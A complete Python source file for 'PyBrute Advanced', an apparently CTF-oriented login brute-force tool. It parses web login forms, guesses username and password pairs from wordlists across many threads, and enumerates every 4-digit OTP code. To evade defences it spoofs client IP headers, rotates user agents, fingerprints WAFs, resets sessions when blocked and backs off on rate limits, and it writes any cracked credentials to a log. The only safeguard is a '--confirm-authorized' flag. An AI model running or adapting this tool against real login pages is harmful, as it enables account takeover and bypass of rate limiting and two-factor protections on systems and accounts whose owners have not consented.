#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PyBrute Advanced - Universal Login Brute Force Tool
Merged and Consolidated Version (2026)
"""

import sys
import os
import re
import time
import json
import random
import signal
import hashlib
import argparse
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qsl
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
from collections import defaultdict

# =============== GLOBAL VARIABLES ===============
STOP_EVENT = threading.Event()
CHECKPOINT_FILE = '.pybrute_checkpoint'
SUCCESS_FILE = 'pybrute_success.log'
LOCK = threading.Lock()
OUTPUT_MODE = 'normal'  # 'silent', 'normal', 'verbose'
SESSION = requests.Session()

# Global settings
RESPONSE_PATTERNS = defaultdict(list)
RESPONSE_SAMPLES = {}

# Statistik
STATS = {
    'start_time': time.time(),
    'total_tested': 0,
    'success_found': False,
    'candidates': []
}

# WAF Bypass configurations
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'curl/8.4.0',
    'python-requests/2.31.0'
]

COMMON_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

WAF_PATTERNS = {
    'cloudflare': ['cloudflare', 'cf-ray', '__cfduid', 'cf-bm'],
    'akamai': ['akamai', 'ak-bmsc'],
    'imperva': ['incapsula', 'visid_incap'],
    'aws_waf': ['aws-waf', 'x-amzn-requestid'],
    'mod_security': ['mod_security', 'libmodsecurity']
}

# =============== UTILITY FUNCTIONS ===============
def normalize_url(url):
    url = url.strip()
    url = re.sub(r'^(https?://)+', 'http://', url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def log_output(message, level='normal'):
    global OUTPUT_MODE
    if OUTPUT_MODE == 'silent' and level == 'normal': return
    if OUTPUT_MODE != 'verbose' and level == 'verbose': return
    
    if message.startswith('\r'):
        sys.stdout.write(message)
        sys.stdout.flush()
    else:
        print(message)

def print_banner():
    banner = r"""
  _____        ____                _       
 |  __ \      |  _ \              | |      
 | |__) |   _ | |_) |_ __ _   _ |_| ___ 
 |  ___/ | | ||  _ <| '__| | | | __/ _ \
 | |   | |_| || |_) | |  | |_| | ||  __/
 |_|    \__, ||____/|_|   \__,_|\__\___|
         __/ |  (Adv. 2026 Enhanced)                            
        |___/                              
    """
    log_output(banner, level='normal')

# =============== FINGERPRINT & WAF ===============
def fingerprint(response):
    body_hash = hashlib.md5(response.text.encode(errors="ignore")).hexdigest()[:8]
    return f"{response.status_code}|{len(response.text)}|{body_hash}"

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_waf_headers():
    headers = COMMON_HEADERS.copy()
    headers['User-Agent'] = get_random_user_agent()
    # Randomized IP headers
    ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    headers['X-Forwarded-For'] = ip
    headers['X-Real-IP'] = ip
    return headers

def detect_waf(resp):
    detected = []
    headers_val = str(resp.headers).lower()
    body_val = resp.text[:2000].lower()
    for waf, patterns in WAF_PATTERNS.items():
        for p in patterns:
            if p in headers_val or p in body_val:
                detected.append(waf)
                break
    return list(set(detected))

def handle_rate_limiting(resp, retry, session):
    if resp.status_code in [429, 503]:
        log_output(f"[!] Rate limited ({resp.status_code}). Backing off...", level='normal')
        time.sleep(10 + retry * 5)
        return True
    if resp.status_code == 403:
        log_output(f"[!] 403 detected. Rotating session...", level='normal')
        session.cookies.clear()
        session.headers.update(get_waf_headers())
        time.sleep(5)
        return True
    return False

def analyze_response_pattern(resp, username, password):
    sig = fingerprint(resp)
    with LOCK:
        RESPONSE_PATTERNS[sig].append(password)
        if sig not in RESPONSE_SAMPLES:
            RESPONSE_SAMPLES[sig] = resp.text[:1000]

def print_response_analysis():
    log_output("\n" + "="*60, level='normal')
    log_output("RESPONSE PATTERNS ANALYSIS", level='normal')
    log_output("="*60, level='normal')
    if not RESPONSE_PATTERNS:
        log_output("No responses recorded.", level='normal')
        return
    for sig, ps in sorted(RESPONSE_PATTERNS.items(), key=lambda x: len(x[1])):
        log_output(f"Pattern: {sig} | Count: {len(ps)}", level='normal')
        if len(ps) <= 3:
            log_output(f"  [!] ANOMALY DETECTED for passwords: {ps}", level='normal')
            # Check for flags in sample
            sample = RESPONSE_SAMPLES.get(sig, "")
            flags = re.findall(r'FLAG\{[^}]+\}', sample, re.I)
            if flags: log_output(f"  [!!!] FLAG FOUND: {flags[0]}", level='normal')

# =============== FORM ANALYSIS ===============
def analyze_post_params(url, timeout=10):
    url = normalize_url(url)
    try:
        resp = requests.get(url, headers=get_waf_headers(), timeout=timeout)
        wafs = detect_waf(resp)
        if wafs: log_output(f"[!] WAF Detected: {', '.join(wafs)}", level='normal')
        
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            log_output("[-] No forms found.", level='normal')
            return
        
        for i, form in enumerate(forms, 1):
            method = form.get('method', 'GET').upper()
            action = urljoin(url, form.get('action') or "")
            log_output(f"\n[+] Form #{i} | {method} | {action}", level='normal')
            inputs = form.find_all('input')
            post_data = []
            for inp in inputs:
                name = inp.get('name')
                if not name: continue
                val = inp.get('value', '')
                t = inp.get('type', 'text').lower()
                if 'user' in name.lower() or 'email' in name.lower():
                    post_data.append(f"{name}=$user")
                elif 'pass' in name.lower() or 'pwd' in name.lower():
                    post_data.append(f"{name}=$pass")
                elif 'otp' in name.lower() or 'code' in name.lower():
                    post_data.append(f"{name}=$pass")
                else:
                    post_data.append(f"{name}={val}")
                log_output(f"    - {name} ({t})", level='normal')
            if method == 'POST':
                log_output(f"    [!] Template: --post \"{'&'.join(post_data)}\"", level='normal')
    except Exception as e:
        log_output(f"[-] Analysis error: {e}", level='normal')

# =============== PAYLOAD GEN ===============
def generate_otp_list(length=4):
    return [str(i).zfill(length) for i in range(10**length)]

def read_wordlist(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except: return []

def build_data_from_template(template, user, password):
    data = {}
    for k, v in parse_qsl(template, keep_blank_values=True):
        data[k] = v.replace('$user', user).replace('$pass', password)
    return data

def is_success_response(resp, success_str, failure_str):
    text = resp.text.lower()
    if success_str and success_str.lower() in text: return True
    if failure_str and failure_str.lower() in text: return False
    
    # Heuristics
    if resp.status_code in [301, 302]:
        loc = resp.headers.get('Location', '').lower()
        if 'login' not in loc and 'error' not in loc: return True
    
    success_indicators = ['welcome', 'dashboard', 'success', 'logout', 'profile']
    for ind in success_indicators:
        if ind in text: return True
    return False

# =============== WORKER ===============
def create_new_session():
    s = requests.Session()
    s.headers.update(get_waf_headers())
    return s

def brute_force_attempt(session, url, user, password, template, success_str, failure_str, attempt_idx, total, timeout, max_retries, reset_interval):
    if STOP_EVENT.is_set(): return False
    if attempt_idx % reset_interval == 0:
        session.cookies.clear()
        session.headers.update(get_waf_headers())
    
    try:
        data = build_data_from_template(template, user, password)
        for retry in range(max_retries):
            try:
                resp = session.post(url, data=data, timeout=timeout, allow_redirects=False)
                if handle_rate_limiting(resp, retry, session): continue
                
                analyze_response_pattern(resp, user, password)
                
                with LOCK:
                    STATS['total_tested'] += 1
                    prog = (attempt_idx / total) * 100 if total > 0 else 0
                    bar = '█' * int(prog/5) + '░' * (20 - int(prog/5))
                    sys.stdout.write(f"\r[*] [{bar}] {prog:.1f}% | {password} | Status: {resp.status_code}")
                    sys.stdout.flush()
                
                if is_success_response(resp, success_str, failure_str):
                    with LOCK:
                        log_output(f"\n\n[+] SUCCESS: {user}:{password}", level='normal')
                        with open(SUCCESS_FILE, 'a') as f:
                            f.write(f"{datetime.now()}: {url} | {user}:{password} | Status: {resp.status_code}\n")
                        STOP_EVENT.set()
                    return True
                break
            except:
                time.sleep(1)
    except: pass
    return False

# =============== CORE ===============
def save_checkpoint(idx, total, user, password):
    ckpt = {'idx': idx, 'total': total, 'last': f"{user}:{password}", 'time': str(datetime.now())}
    try:
        with open(CHECKPOINT_FILE, 'w') as f: json.dump(ckpt, f)
    except: pass

def load_checkpoint():
    if not os.path.exists(CHECKPOINT_FILE): return None
    try:
        with open(CHECKPOINT_FILE, 'r') as f: return json.load(f)
    except: return None

def brute_force_attack(url, userlist, passlist, template, success_str, failure_str, threads, timeout, delay, resume, otp_mode, otp_length, reset):
    global STATS
    if otp_mode:
        users, passwords = ['user'], generate_otp_list(otp_length)
    else:
        users, passwords = read_wordlist(userlist), read_wordlist(passlist)
    
    total = len(users) * len(passwords)
    start_idx = 0
    if resume:
        ckpt = load_checkpoint()
        if ckpt: start_idx = ckpt['idx']
    
    def signal_handler(sig, frame):
        log_output("\n[!] Saving checkpoint...", level='normal')
        save_checkpoint(STATS['total_tested'], total, "N/A", "N/A")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)

    log_output(f"[*] Starting attack: {total} attempts | {threads} threads", level='normal')
    
    idx = 0
    with ThreadPoolExecutor(max_workers=threads) as exc:
        futures = {}
        for u in users:
            if STOP_EVENT.is_set(): break
            for p in passwords:
                idx += 1
                if idx <= start_idx: continue
                if STOP_EVENT.is_set(): break
                
                session = create_new_session()
                f = exc.submit(brute_force_attempt, session, url, u, p, template, success_str, failure_str, idx, total, timeout, 3, reset)
                futures[f] = idx
                
                if delay > 0: time.sleep(delay)
                if len(futures) > threads * 2:
                    done, _ = wait(futures.keys(), return_when=FIRST_COMPLETED)
                    for df in done: del futures[df]

    if STOP_EVENT.is_set():
        if os.path.exists(CHECKPOINT_FILE): os.remove(CHECKPOINT_FILE)
    else:
        log_output("\n[*] Done.", level='normal')
    print_response_analysis()

# =============== MAIN ===============
def main():
    parser = argparse.ArgumentParser(description='PyBrute Advanced')
    parser.add_argument('--url', required=True)
    parser.add_argument('--analyze', action='store_true')
    parser.add_argument('--post')
    parser.add_argument('--userlist')
    parser.add_argument('--passlist')
    parser.add_argument('--otp-mode', action='store_true')
    parser.add_argument('--otp-length', type=int, default=4)
    parser.add_argument('--success')
    parser.add_argument('--failure')
    parser.add_argument('--threads', type=int, default=5)
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--delay', type=float, default=0.0)
    parser.add_argument('--session-reset', type=int, default=50)
    parser.add_argument('--resume', action='store_true')
    parser.add_argument('--confirm-authorized', action='store_true')
    parser.add_argument('--verbose', action='store_true')
    parser.add_argument('--silent', action='store_true')

    args = parser.parse_args()
    global OUTPUT_MODE
    if args.silent: OUTPUT_MODE = 'silent'
    elif args.verbose: OUTPUT_MODE = 'verbose'
    
    print_banner()
    if args.analyze:
        analyze_post_params(args.url, args.timeout)
        sys.exit(0)
    
    if not args.confirm_authorized:
        log_output("[!] Use --confirm-authorized to proceed.", level='normal')
        sys.exit(1)
    
    if not args.post:
        log_output("[!] --post is required.", level='normal')
        sys.exit(1)

    brute_force_attack(args.url, args.userlist, args.passlist, args.post, args.success, args.failure,
                       args.threads, args.timeout, args.delay, args.resume, args.otp_mode, args.otp_length, args.session_reset)

if __name__ == '__main__':
    main()
